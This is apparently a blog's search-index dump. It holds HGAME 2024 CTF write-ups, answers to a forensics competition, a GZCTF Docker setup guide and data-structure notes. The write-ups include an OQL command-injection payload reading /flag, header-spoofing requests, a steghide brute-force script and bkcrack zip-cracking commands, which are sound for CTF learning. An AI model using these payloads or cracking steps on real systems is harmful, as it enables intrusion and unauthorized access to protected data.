使用deepsound工具 提取出XXX.zip并解压，得到gif文件，会看到有二维码闪烁 对gif文件进行逐帧提取 拼合二维码 对二维码进行修复 ","date":"2024-02-14","objectID":"/hgame2024_week2/:2:3","series":null,"tags":["CTF","wp"],"title":"HGAME2024_week2_wp","uri":"/hgame2024_week2/#龙之舞"},{"categories":["CTF","wp"],"content":"HGAME2024_week1_web\u0026misc ","date":"2024-02-11","objectID":"/hgame2024_week1/:0:0","series":null,"tags":["CTF","wp"],"title":"HGAME2024_week1_wp","uri":"/hgame2024_week1/#"},{"categories":["CTF","wp"],"content":"\rWeek1","date":"2024-02-11","objectID":"/hgame2024_week1/:0:0","series":null,"tags":["CTF","wp"],"title":"HGAME2024_week1_wp","uri":"/hgame2024_week1/#week1"},{"categories":["CTF","wp"],"content":"\rweb","date":"2024-02-11","objectID":"/hgame2024_week1/:1:0","series":null,"tags":["CTF","wp"],"title":"HGAME2024_week1_wp","uri":"/hgame2024_week1/#web"},{"categories":["CTF","wp"],"content":"\r[ezHTTP]exp： GET / HTTP/1.1 Host: 47.100.245.185:31927 Referer: vidar.club X-Real-IP: 127.0.0.1 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Vidar; VidarOS x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate, br Accept-Language: zh-CN,zh;q=0.9,en;q=0.8 Connection: close 使用repeater发包后，解码响应的jwt得到flag 请从vidar.club登录： Referer: vidar.club 请使用Mozilla/5.0 (Vidar; VidarOS x86_64)......访问 User-Agent: Mozilla/5.0 (Vidar; VidarOS x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0 请从本地登录 X-Real-IP: 127.0.0.1 //X-Forwarded-For失效，或许黑名单了 ","date":"2024-02-11","objectID":"/hgame2024_week1/:1:1","series":null,"tags":["CTF","wp"],"title":"HGAME2024_week1_wp","uri":"/hgame2024_week1/#ezhttp"},{"categories":["CTF","wp"],"content":"\r[Bypass it]This page requires javascript to be enabled :) 开启js无法注册，将js禁用可成功注册，随后登录得到flag ","date":"2024-02-11","objectID":"/hgame2024_week1/:1:2","series":null,"tags":["CTF","wp"],"title":"HGAME2024_week1_wp","uri":"/hgame2024_week1/#bypass-it"},{"categories":["CTF","wp"],"content":"\r[Select Courses]对每个课程疯狂发包 exp: POST /api/courses HTTP/1.1 Host: 47.100.245.185:30640 Content-Length: 8 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36 Content-Type: application/json Accept: */* Origin: http://47.100.245.185:30640 Referer: http://47.100.245.185:30640/ Accept-Encoding: gzip, deflate, br Accept-Language: zh-CN,zh;q=0.9,en;q=0.8 Connection: close {\"id\":3} ","date":"2024-02-11","objectID":"/hgame2024_week1/:1:3","series":null,"tags":["CTF","wp"],"title":"HGAME2024_week1_wp","uri":"/hgame2024_week1/#select-courses"},{"categories":["CTF","wp"],"content":"\r[2048*16]\r解法1：base64换表在js里面发现两串疑似base编码的字符串 base64换表 解法2：js拦截修改参考： https://introvertedturtles.wordpress.com/2019/02/17/how-to-hack-2048-two-ways/ 拦截环境页面js之前先清除一下浏览器的js缓存 随后在bp设置中，把不拦截js规则取消 修改返回的js中关键代码，\u003c.9?2:4，2和4都修改为16384 var n=Math[x(494)]()\u003c.9?2:4,e=new j(this.grid[x(477)](),n); ","date":"2024-02-11","objectID":"/hgame2024_week1/:1:4","series":null,"tags":["CTF","wp"],"title":"HGAME2024_week1_wp","uri":"/hgame2024_week1/#204816"},{"categories":["CTF","wp"],"content":"\r[2048*16]\r解法1：base64换表在js里面发现两串疑似base编码的字符串 base64换表 解法2：js拦截修改参考： https://introvertedturtles.wordpress.com/2019/02/17/how-to-hack-2048-two-ways/ 拦截环境页面js之前先清除一下浏览器的js缓存 随后在bp设置中，把不拦截js规则取消 修改返回的js中关键代码，\u003c.9?2:4，2和4都修改为16384 var n=Math[x(494)]()\u003c.9?2:4,e=new j(this.grid[x(477)](),n); ","date":"2024-02-11","objectID":"/hgame2024_week1/:1:4","series":null,"tags":["CTF","wp"],"title":"HGAME2024_week1_wp","uri":"/hgame2024_week1/#解法1base64换表"},{"categories":["CTF","wp"],"content":"\r[2048*16]\r解法1：base64换表在js里面发现两串疑似base编码的字符串 base64换表 解法2：js拦截修改参考： https://introvertedturtles.wordpress.com/2019/02/17/how-to-hack-2048-two-ways/ 拦截环境页面js之前先清除一下浏览器的js缓存 随后在bp设置中，把不拦截js规则取消 修改返回的js中关键代码，\u003c.9?2:4，2和4都修改为16384 var n=Math[x(494)]()\u003c.9?2:4,e=new j(this.grid[x(477)](),n); ","date":"2024-02-11","objectID":"/hgame2024_week1/:1:4","series":null,"tags":["CTF","wp"],"title":"HGAME2024_week1_wp","uri":"/hgame2024_week1/#解法2js拦截修改"},{"categories":["CTF","wp"],"content":"\r[jhat]\rOQL(对象查询语言)在产品实现中造成的RCE(Object Injection) JVM 对象查询语言（OQL） new java.util.Scanner(java.lang.Runtime.getRuntime().exec('ls /').getInputStream()) new java.util.Scanner(java.lang.Runtime.getRuntime().exec('cat /flag').getInputStream()) ","date":"2024-02-11","objectID":"/hgame2024_week1/:1:5","series":null,"tags":["CTF","wp"],"title":"HGAME2024_week1_wp","uri":"/hgame2024_week1/#jhat"},{"categories":["CTF","wp"],"content":"\rmisc","date":"2024-02-11","objectID":"/hgame2024_week1/:2:0","series":null,"tags":["CTF","wp"],"title":"HGAME2024_week1_wp","uri":"/hgame2024_week1/#misc"},{"categories":["CTF","wp"],"content":"\r[Sign in]https://lab.magiconch.com/xzk/ 从底部平视或者用图像编辑软件自动校正一下 ","date":"2024-02-11","objectID":"/hgame2024_week1/:2:1","series":null,"tags":["CTF","wp"],"title":"HGAME2024_week1_wp","uri":"/hgame2024_week1/#sign-in"},{"categories":["CTF","wp"],"content":"\r[签到]\r","date":"2024-02-11","objectID":"/hgame2024_week1/:2:2","series":null,"tags":["CTF","wp"],"title":"HGAME2024_week1_wp","uri":"/hgame2024_week1/#签到"},{"categories":["CTF","wp"],"content":"\r[希尔希尔希尔]\r然后 发现key 同时 提取出来，是个压缩包，得到： 在线解密网站 https://ctf.bugku.com/tool/hill ","date":"2024-02-11","objectID":"/hgame2024_week1/:2:3","series":null,"tags":["CTF","wp"],"title":"HGAME2024_week1_wp","uri":"/hgame2024_week1/#希尔希尔希尔"},{"categories":["CTF","wp"],"content":"\r[simple_attack]压缩后的大小不同，但CRC冗余循环检验是一样的 明文攻击 工具：ARCHPR 4.54 工具：bkcrack https://cloud.tencent.com/developer/article/2215202 安装： 先从github获取资源，windows中安装bkcrack还需要额外安装VC++的Redistributable git clone https://github.com/kimci86/bkcrack.git 然后配置cmake工具，需要用到cmake手动构建brack的项目代码 pip install cmake 安装好后进入bkcrack文件夹内分别运行三段代码 cmake -S . -B build -DCMAKE_INSTALL_PREFIX=install cmake --build build --config Release cmake --build build --config Release --target install 进入install文件夹通过终端运行 使用： C:\\Users\\scofi\\Desktop\\bkcrack\\install\u003ebkcrack.exe -C Downloads.zip -c aa.png -P aa.zip -p aa.png 其中-C表示密文（cipher），-p为明文（plaintext） -C指外层文件，-c指内层文件 下一步 bkcrack.exe -C Downloads.zip -c aa.png -k e0be8d5d 70bb3140 7e983fff -d uncracked -d指定存文件的路径 随后 bkcrack -C attachment.zip -k key -U new.zip good -U表示更改密码，前面是新压缩包的名，后面是设置的密码 得到的txt文本进行base64 to file，base64-\u003e图片 ","date":"2024-02-11","objectID":"/hgame2024_week1/:2:4","series":null,"tags":["CTF","wp"],"title":"HGAME2024_week1_wp","uri":"/hgame2024_week1/#simple_attack"},{"categories":["CTF","wp"],"content":"\r[来自星辰的问候]\r根据提示，六位弱密码，通过steghide爆破 steghide info secret.jpg 生成一个6位数数字密码 crunch 6 6 0123456789 \u003e passwd.txt 然后通过shell脚本，进行steghide密码爆破 #bruteStegHide.sh #!/bin/bash for line in `cat $2`;do steghide extract -sf $1 -p $line \u003e /dev/null 2\u003e\u00261 if [[ $? -eq 0 ]];then echo 'password is: '$line exit fi done 随后 ./bruteStegHide.sh ../scofield/secret.jpg passwd.txt 得到密码123456 提取文件 steghide extract -sf secret.jpg -p 123456 解压压缩包，得到图片和一个离线网页 随后在网上搜索来自星尘这款游戏的字体 https://github.com/MY1L/Ctrl/releases 通过比对，得到flag ","date":"2024-02-11","objectID":"/hgame2024_week1/:2:5","series":null,"tags":["CTF","wp"],"title":"HGAME2024_week1_wp","uri":"/hgame2024_week1/#来自星辰的问候"},{"categories":["Forensics","wp"],"content":"赛后完整复现 检材一硬盘的 MD5 值为多少？ 80518bc0dbf3315f806e9edf7ee13c12 2. 检材一 bitlocker 的恢复密钥是多少？ 585805-292292-462539-352495-691284-509212-527219-095942 PasswareKitForensic 检材一镜像中用户最近一次打开的文件名是什么？ 列表.xlsx 检材一硬盘系统分区的起始位置？ 332398592 （火眼分析好像无法取物理位置） 检材一系统的版本号是多少（格式：x.x.x.x） 10.0.19042.508 检材一回收站中的文件被删除前的路径 C:\\Users\\rd\\Desktop\\iTunes(12.13.0.9).exe 检材一给出最后一次修改系统时间前的时间 2023-12-12 16:37:12 检材一最后一次远程连接本机的时间 2023-12-11 15:57:02 检材一 Chrome 浏览器最后一次搜索过的关键词是什么 常见的诈骗话术 2023 检材一是否连接过 U 盘，如有，请给出 U 盘的 SN 码 FC2005927F271 检材一 Edge 浏览器最早一次下载过的文件文件名是 winrar-x64-624scp.exe 嫌疑人访问的微博的密码的 MD5 值 5cb42860b3b61ef6dd361ad556f48e05 13、14、15、17. 检材二备份的设备名称是什么，检材二手机的 IOS 系统版本是多少，检材二备份的时间是多少，检材二使用过的号码 ICCID 是多少。 设备名称：“User” 的 iPhone IOS 系统版本：17.0 备份的时间是：2023-12-09 15:02:28 使用过的号码 ICCID 是：89860000191997734908 嫌疑人 iphone 手机给号码 “13502409024” 最后一次打电话的时间是。 由从检材1中提取出的ios备份数据得知， 由加密备份中获取到的手机通话记录可知给号码 “13502409024” 最后一次打电话的时间是 2023-12-04 13:18:50 检材二手机中高德地图最后搜索的地址。 万达广场 (南沙店)(双山大道 3 号) 检材二手机最后一次登陆 / 注册 “HotsCoin” 的日期是 2023-12-04 检材二手机中照片 “IMG_0002” 的拍摄时间是？ 2023-12-06 11:08:30 检材二中 “小西米语音”app 的 Bundle ID 是什么？ com.titashow.tangliao 检材二中浏览器最后一次搜索的关键词是什么？ ios 备份密码忘了怎么办 五位纯数字 23-24. 嫌疑人和洗钱人员约定电子钱包的品牌是什么，金额比例是什么。 imToken Bitcoin 0.2 通过 “小西米语音” 约定如题内容，具体位置为该 app 备份数据下 “/AppDomain-com.titashow.tangliao/Documents/IM5_CN/9031bc3c805ac5e55ecaa151092c2c4b/IM5_storage/1399634813467579522 文件中 message 表 检材三中进程 “FTK Imager.exe” 的 PID 是多少？ 11328 检材三中显示的系统时间是多少？ 2023-12-12 04:06:25 检材三中记录的当前系统 ip 是多少？ 172.18.7.229 检材四中迅雷下载过的文件名是什么？ 《向银河靠近》.txt 29、32. 检材四中安装了哪些可是实现翻墙（VPN）功能的 app，FileCompress app 包名是什么？ Clash com.zs.filecompress 30、31. 检材四备份的设备系统版本是多少，检材四备份的时间是多少（答案以 13 位时间戳表示） 由备份文件中 “descript.xml” 可知： V14.0.2.0.TKSCNXM 1702101947266 检材四中备忘录记录的内容是什么？（tip） Vcpswd:edgewallet 请列出检材四中所有虚拟币钱包 app 的包名。 de.schildbach.wallet、com.bitcoin.mwallet、piuk.blockchain.android、im.token.app、com.paxful.wallet（火币不算，火币更多的是交易平台） 检材四中嫌疑人使用 Bitcoin Wallet 钱包地址是什么？ bc1q4ru3a8r0vzymwwcmawvtdyf6hkvt2x9477hjkt 在该 app 备份数据中 “apps\\de.schildbach.wallet\\f\\log\\wallet.log” 文件中保存，搜 “enlarged” 关键字 36.MD5 值为 “FF3DABD0A610230C2486BFFBE15E5DFF” 的文件在检材四中的位置 FileCompress(com.zs.filecompress).bak\\FileCompress\\11 月.txt 检材中受害人的微信号是多少？ B-I-N-A-R-Y 嫌疑人曾通过微信购买过一个公民信息数据库，该数据库中手机尾号是 8686 的用户的姓名是 章敏 嫌疑人手机中是否保存了小西米语音 app 的账号密码，如有，请写出其密码. jamvU1@wiwgug$bo 上一题数据库中，截止到 2023 年 12 月 31 日，年龄大于等于 18 且小于等于 30 岁之间的用户信息数量 1717 身份证里面年份是 “1993-2005” 年的人 受害人小浩的手机号码是多少 13533333333 存放在加密的 “11 月.txt” 文件，可以从检材4导出filecompress安装包，使用 jadx 工具反编译安装包，发现文件加密方式为常见的压缩方式，密码为 “1!8Da9Re5it2b3a.” 完整的受害人名单是几个人。 6 人 分别存放在三个位置 1、“9 月. txt”、“10 月. txt” 存放在检材一中的 VeraCrypt 加密容器里（C:\\Users\\rd\\Documents \\ 新建文本文档. txt） 2、“11 月. txt” 存放在检材四中（20231213_172032\\FileCompress(com.zs.filecompress)\\FileCompress\\11 月. txt） 受害人转账的总金额是多少 600 元 检材 2 恢复出的转账记录 加密备份转账记录 以下解题思路来自第四届中科实数杯官方wp： 正常对检材 1- 检材 4 进行正常的数据解密、获取和分析。 根据题目提示发现嫌疑人曾搜索过 “ios 备份密码忘了怎么办 五位纯数字”，分析嫌疑人可能还有一个加密的备份，在检材 1 默认的 itunes 备份目录下找到该加密备份，对该备份进行正常的数据解密、获取和分析。 3. 从加密备份中获取到了 keychain 数据，发现其中有小西米语音的账号密码和检材 1 的开机密码数据。由题目提示也可指小西米语音内有猫腻，查聊天记录发现其存在于洗钱人员约定的钱包品牌和比例。 4. 从题目提示到的 FileCompress app 和 MD5 文件所指向的文件 “11 月.txt” 为加密文件，通过逆向分析即可破解，发现其文件为受害人名单。（也可以通过检材四备份获取其安装包，安装到模拟器或安卓手机上，导入加密文件即可解密） 5. 通过分析检材一的最近访问文档记录，发现存在可疑文件 “9 月.txt”、“10 月.txt” 6. 通过分析检材一的最近访问文档记录、加密文件分析、反取证软件列表，发现可疑文件 “[C]:\\Users\\rd\\Documents\\ 新建文本文档.txt” 为 VeraCrypt 加密文件 7. 再根据题目备忘录内容，VeraCrypt 加密文件的密码与 edgewallet 相关。查 edgewallet 在检材 1 浏览器保存的账号密码里面有体现，仿真检材 1，输入 keychain 获取的开机密码，查看浏览器保存密码的明文，使用该密码打开 Vc 加密文件，查看其中的内容。 ","date":"2024-02-10","objectID":"/zkssb4/:0:0","series":null,"tags":["Forensics","wp"],"title":"第四届“中科实数杯”全国电子数据取证与司法鉴定挑战赛","uri":"/zkssb4/#"},{"categories":["web"],"content":"环境：Ubuntu20.04 ","date":"2024-01-20","objectID":"/docker_gzctf/:0:0","series":null,"tags":["web"],"title":"GZCTF搭建","uri":"/docker_gzctf/#"},{"categories":["web"],"content":"\rdocker安装1.更新系统软件包列表： sudo apt update 2.安装必要的依赖项： sudo apt install apt-transport-https ca-certificates curl software-properties-common 3.添加 Docker GPG 密钥： curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg 4.设置 Docker 存储库： 对于 x86_64（通常为 64 位）系统： echo \"deb [arch=amd64 signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable\" | sudo tee /etc/apt/sources.list.d/docker.list \u003e /dev/null 对于 ARMhf（如 Raspberry Pi）或其他特定体系结构的系统，请根据官方文档中提供的指南选择正确的存储库。 5.更新软件包索引并安装 Docker CE（社区版）： sudo apt update sudo apt install docker-ce docker-ce-cli containerd.io 6.将当前用户添加到 docker 组（无需重启）： sudo usermod -aG docker $USER 7.注销并重新登录以使用户组变更生效。 若出现下面的报错： [xxxx@xxxx ~]$ docker ps Got permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock: Get \"http://%2Fvar%2Frun%2Fdocker.sock/v1.24/containers/json\": dial unix /var/run/docker.sock: connect: permission denied 问题出在用户为访问/var/run/docker.sock的权限，只需给用户增加权限即可。命令行输入： sudo chown root:docker /var/run/docker.sock # 修改docker.sock权限为root:docker sudo groupadd docker # 添加docker用户组 sudo gpasswd -a $USER docker # 将当前用户添加至docker用户组 newgrp docker # 更新docker用户组 ","date":"2024-01-20","objectID":"/docker_gzctf/:0:1","series":null,"tags":["web"],"title":"GZCTF搭建","uri":"/docker_gzctf/#docker安装"},{"categories":["web"],"content":"\rGZCTF部署新建一个文件夹gzctf，创建两个文件appsettings.json，docker-compose.yml appsettings.json写入： { \"AllowedHosts\": \"*\", \"ConnectionStrings\": { \"Database\": \"Host=db:5432;Database=gzctf;Username=postgres;Password=kunkk\" }, \"EmailConfig\": { \"SendMailAddress\": \"a@a.com\", \"UserName\": \"\", \"Password\": \"\", \"Smtp\": { \"Host\": \"localhost\", \"Port\": 587 } }, \"XorKey\": \"xxxx\", \"ContainerProvider\": { \"Type\": \"Docker\", // or \"Kubernetes\" \"PortMappingType\": \"Default\", // or \"PlatformProxy\" \"EnableTrafficCapture\": false, \"PublicEntry\": \"ctf.example.com\", // or \"xxx.xxx.xxx.xxx\" // optional \"DockerConfig\": { \"SwarmMode\": false, \"Uri\": \"unix:///var/run/docker.sock\" } }, \"RequestLogging\": false, \"DisableRateLimit\": true, \"RegistryConfig\": { \"UserName\": \"\", \"Password\": \"\", \"ServerAddress\": \"\" }, \"CaptchaConfig\": { \"Provider\": \"None\", // or \"CloudflareTurnstile\" or \"GoogleRecaptcha\" \"SiteKey\": \"111\", \"SecretKey\": \"111\", // optional \"GoogleRecaptcha\": { \"VerifyAPIAddress\": \"https://www.recaptcha.net/recaptcha/api/siteverify\", \"RecaptchaThreshold\": \"0.5\" } }, \"ForwardedOptions\": { \"ForwardedHeaders\": 5, \"ForwardLimit\": 1, \"TrustedNetworks\": [\"192.168.12.0/8\"] } } docker-compose.yml写入： version: \"3.0\" services: gzctf: image: gztime/gzctf:latest restart: always environment: - \"GZCTF_ADMIN_PASSWORD=MYpassword123\" ports: - \"80:80\" volumes: - \"./data/files:/app/files\" - \"./appsettings.json:/app/appsettings.json:ro\" # - \"./k8sconfig.yaml:/app/k8sconfig.yaml:ro\" # this is required for k8s deployment - \"/var/run/docker.sock:/var/run/docker.sock\" # this is required for docker deployment depends_on: - db db: image: postgres:alpine restart: always environment: - \"POSTGRES_PASSWORD=kunkk\" volumes: - \"./data/db:/var/lib/postgresql/data\" 然后在gzctf文件夹中执行： docker-compose up -d 随后docker ps查看容器ID： sco@sco-virtual-machine:~/gzctf$ docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES ce2011ceac5a gztime/gzctf:latest \"dotnet GZCTF.dll\" 13 minutes ago Up 4 seconds (health: starting) 0.0.0.0:80-\u003e80/tcp, :::80-\u003e80/tcp gzctf-gzctf-1 7a335b65fdd2 postgres:alpine \"docker-entrypoint.s…\" 13 minutes ago Up 3 seconds 5432/tcp gzctf-db-1 使用docker logs 7a335b65fdd2查看数据库日志 随后访问https://127.0.0.1:80 相关题目补充后面再写…… ","date":"2024-01-20","objectID":"/docker_gzctf/:0:2","series":null,"tags":["web"],"title":"GZCTF搭建","uri":"/docker_gzctf/#gzctf部署"},{"categories":["web"],"content":"\r注意事项第一次启动之后docker中postgresql的密码不能再做修改，改成其他密码会认证失败 平台初始管理员账号Admin密码要稍微复杂点 ","date":"2024-01-20","objectID":"/docker_gzctf/:0:3","series":null,"tags":["web"],"title":"GZCTF搭建","uri":"/docker_gzctf/#注意事项"},{"categories":["web"],"content":"\r附录postgresql相关命令： docker compose exec db psql -U postgres psql -U postgres -W psql (15.2) Type \"help\" for help. postgres=# \\c gzctf You are now connected to database \"gzctf\" as user \"postgres\". gzctf=# #do your sql query 进入docker容器： docker exec -it gzctf-db-1 bash 参考笔记： gzctf： https://docs.ctf.gzti.me/quick-start https://blog.csdn.net/qq_41738909/article/details/133660399 https://blog.csdn.net/a142151/article/details/130944500 https://wdh.hk/tech/ctf/%E6%96%B0%E7%9F%A5/GZCTF%E9%83%A8%E7%BD%B2%E7%AC%94%E8%AE%B0.html ctfd: https://blog.csdn.net/Myon5/article/details/134540207 ","date":"2024-01-20","objectID":"/docker_gzctf/:0:4","series":null,"tags":["web"],"title":"GZCTF搭建","uri":"/docker_gzctf/#附录"},{"categories":["notice"],"content":"我摆了，您随意……. ","date":"2023-12-19","objectID":"/data_structure_notes/:0:0","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#"},{"categories":["notice"],"content":"\r数据结构期末考试","date":"2023-12-19","objectID":"/data_structure_notes/:0:0","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#数据结构期末考试"},{"categories":["notice"],"content":"\r题型安排名词解释5道 计算题5道 应用题6道（共五十分，其余共五十分） 算法设计题2道 ","date":"2023-12-19","objectID":"/data_structure_notes/:1:0","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#题型安排"},{"categories":["notice"],"content":"\r重点","date":"2023-12-19","objectID":"/data_structure_notes/:2:0","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#重点"},{"categories":["notice"],"content":"\r第一章绪论重点考概念 概念什么是数据结构？ 数据结构是相互之间存在一种或多种特定关系的数据元素的集合。 什么是算法？ 一个又穷的指令集，这些指令为解决某一特定任务规定了一个运算序列。 算法的描述：自然语言，流程图，程序设计语言，伪码。 什么是时间复杂度？ 算法中基本语句重复执行的次数是问题规模n的某个函数f(n),算法的时间量度记作：T(n)=O(f(n))，表示随着n的增大，算法执行的时间的增长率和f(n)的增长率相同，称渐近时间复杂度，简称时间复杂度。 ","date":"2023-12-19","objectID":"/data_structure_notes/:2:1","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#第一章绪论"},{"categories":["notice"],"content":"\r第一章绪论重点考概念 概念什么是数据结构？ 数据结构是相互之间存在一种或多种特定关系的数据元素的集合。 什么是算法？ 一个又穷的指令集，这些指令为解决某一特定任务规定了一个运算序列。 算法的描述：自然语言，流程图，程序设计语言，伪码。 什么是时间复杂度？ 算法中基本语句重复执行的次数是问题规模n的某个函数f(n),算法的时间量度记作：T(n)=O(f(n))，表示随着n的增大，算法执行的时间的增长率和f(n)的增长率相同，称渐近时间复杂度，简称时间复杂度。 ","date":"2023-12-19","objectID":"/data_structure_notes/:2:1","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#概念"},{"categories":["notice"],"content":"\r第二章线性表\r概念什么是顺序表？ 顺序表是在计算机内存中以数组的形式保存的线性表。 什么是单链表？ 单链表是一种链式存取的数据结构，用一组地址任意的存储单元存放线性表中的数据元素。 简答题顺序表和链表的优缺点 顺序表优点： 存储密度大 可以随机存取表中任一元素 容易查找一个结点的前驱和后继 顺序表缺点： 在插入、删除某一元素时，需要移动大量元素 浪费存储空间 属于静态存储形式，数据元素的个数不能自由扩充 建立空表时，较难确定所需的存储空间 链表优点： 数据元素的个数可以自由扩充 插入、删除等操作不必移动数据，只需要修改链接指针，修改效率高 链表缺点： 存储密度小 存取效率不高，必须采用顺序存取，即存取数据元素时，只能按链表的顺序进行访问 顺序表中第i个元素的地址进行推导计算 由数据元素在内存的存储推导数据元素之间的关系 操作题单链表的插入 (1)查找第i-1个结点p； (2)生成结点s,存入元素e; (3)s-\u003enext=p-\u003enext, p-\u003enext=s; 单链表的删除 (1) 查找第i-1个结点p； (2) q=p-\u003enext;p-\u003enext=q-\u003enext; (3) free(q) ","date":"2023-12-19","objectID":"/data_structure_notes/:2:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#第二章线性表"},{"categories":["notice"],"content":"\r第二章线性表\r概念什么是顺序表？ 顺序表是在计算机内存中以数组的形式保存的线性表。 什么是单链表？ 单链表是一种链式存取的数据结构，用一组地址任意的存储单元存放线性表中的数据元素。 简答题顺序表和链表的优缺点 顺序表优点： 存储密度大 可以随机存取表中任一元素 容易查找一个结点的前驱和后继 顺序表缺点： 在插入、删除某一元素时，需要移动大量元素 浪费存储空间 属于静态存储形式，数据元素的个数不能自由扩充 建立空表时，较难确定所需的存储空间 链表优点： 数据元素的个数可以自由扩充 插入、删除等操作不必移动数据，只需要修改链接指针，修改效率高 链表缺点： 存储密度小 存取效率不高，必须采用顺序存取，即存取数据元素时，只能按链表的顺序进行访问 顺序表中第i个元素的地址进行推导计算 由数据元素在内存的存储推导数据元素之间的关系 操作题单链表的插入 (1)查找第i-1个结点p； (2)生成结点s,存入元素e; (3)s-\u003enext=p-\u003enext, p-\u003enext=s; 单链表的删除 (1) 查找第i-1个结点p； (2) q=p-\u003enext;p-\u003enext=q-\u003enext; (3) free(q) ","date":"2023-12-19","objectID":"/data_structure_notes/:2:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#概念-1"},{"categories":["notice"],"content":"\r第二章线性表\r概念什么是顺序表？ 顺序表是在计算机内存中以数组的形式保存的线性表。 什么是单链表？ 单链表是一种链式存取的数据结构，用一组地址任意的存储单元存放线性表中的数据元素。 简答题顺序表和链表的优缺点 顺序表优点： 存储密度大 可以随机存取表中任一元素 容易查找一个结点的前驱和后继 顺序表缺点： 在插入、删除某一元素时，需要移动大量元素 浪费存储空间 属于静态存储形式，数据元素的个数不能自由扩充 建立空表时，较难确定所需的存储空间 链表优点： 数据元素的个数可以自由扩充 插入、删除等操作不必移动数据，只需要修改链接指针，修改效率高 链表缺点： 存储密度小 存取效率不高，必须采用顺序存取，即存取数据元素时，只能按链表的顺序进行访问 顺序表中第i个元素的地址进行推导计算 由数据元素在内存的存储推导数据元素之间的关系 操作题单链表的插入 (1)查找第i-1个结点p； (2)生成结点s,存入元素e; (3)s-\u003enext=p-\u003enext, p-\u003enext=s; 单链表的删除 (1) 查找第i-1个结点p； (2) q=p-\u003enext;p-\u003enext=q-\u003enext; (3) free(q) ","date":"2023-12-19","objectID":"/data_structure_notes/:2:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#简答题"},{"categories":["notice"],"content":"\r第二章线性表\r概念什么是顺序表？ 顺序表是在计算机内存中以数组的形式保存的线性表。 什么是单链表？ 单链表是一种链式存取的数据结构，用一组地址任意的存储单元存放线性表中的数据元素。 简答题顺序表和链表的优缺点 顺序表优点： 存储密度大 可以随机存取表中任一元素 容易查找一个结点的前驱和后继 顺序表缺点： 在插入、删除某一元素时，需要移动大量元素 浪费存储空间 属于静态存储形式，数据元素的个数不能自由扩充 建立空表时，较难确定所需的存储空间 链表优点： 数据元素的个数可以自由扩充 插入、删除等操作不必移动数据，只需要修改链接指针，修改效率高 链表缺点： 存储密度小 存取效率不高，必须采用顺序存取，即存取数据元素时，只能按链表的顺序进行访问 顺序表中第i个元素的地址进行推导计算 由数据元素在内存的存储推导数据元素之间的关系 操作题单链表的插入 (1)查找第i-1个结点p； (2)生成结点s,存入元素e; (3)s-\u003enext=p-\u003enext, p-\u003enext=s; 单链表的删除 (1) 查找第i-1个结点p； (2) q=p-\u003enext;p-\u003enext=q-\u003enext; (3) free(q) ","date":"2023-12-19","objectID":"/data_structure_notes/:2:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#操作题"},{"categories":["notice"],"content":"\r第三章栈和队列主要在简答题和计算题 计算题判断合法的入栈出栈序列 先入后出 判断合法的入队出队序列 先入先出 简答题循环队列关于队空队满的条件判断 ","date":"2023-12-19","objectID":"/data_structure_notes/:2:3","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#第三章栈和队列"},{"categories":["notice"],"content":"\r第三章栈和队列主要在简答题和计算题 计算题判断合法的入栈出栈序列 先入后出 判断合法的入队出队序列 先入先出 简答题循环队列关于队空队满的条件判断 ","date":"2023-12-19","objectID":"/data_structure_notes/:2:3","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#计算题"},{"categories":["notice"],"content":"\r第三章栈和队列主要在简答题和计算题 计算题判断合法的入栈出栈序列 先入后出 判断合法的入队出队序列 先入先出 简答题循环队列关于队空队满的条件判断 ","date":"2023-12-19","objectID":"/data_structure_notes/:2:3","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#简答题-1"},{"categories":["notice"],"content":"\r第四章串、数组和广义表\r概念什么是广义表？ n ( n\u003e0 )个表元素组成的有限序列，是线性表的一种推广。记作LS = (a0, a1, a2, …, an-1)。 求模式串的next函数（比较重要但考试不考，李健说的） 计算题给首元素地址，和元素所占据的存储空间，求该元素的下标 广义表求表头，求表尾，求表长度 例5.11 广义表E=( a, ( a,b ), d, e, ( ( i , j ),k ))的表头为( )，表尾为( )，长度为( )，深度为( )。 答：表头为a，表尾为 ( ( a,b ), d, e, ( ( i , j ),k ) )，长度为 5，深度为 3。 任何一个非空的广义表其表头可能是原子，也可能是子表，而表尾一定是子表。 简答题特殊矩阵（上三角，下三角，对称阵，稀疏矩阵(一般不好考)）的存储方法 对称矩阵 三角矩阵 对角矩阵（带状矩阵） 稀疏矩阵 ","date":"2023-12-19","objectID":"/data_structure_notes/:2:4","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#第四章串数组和广义表"},{"categories":["notice"],"content":"\r第四章串、数组和广义表\r概念什么是广义表？ n ( n\u003e0 )个表元素组成的有限序列，是线性表的一种推广。记作LS = (a0, a1, a2, …, an-1)。 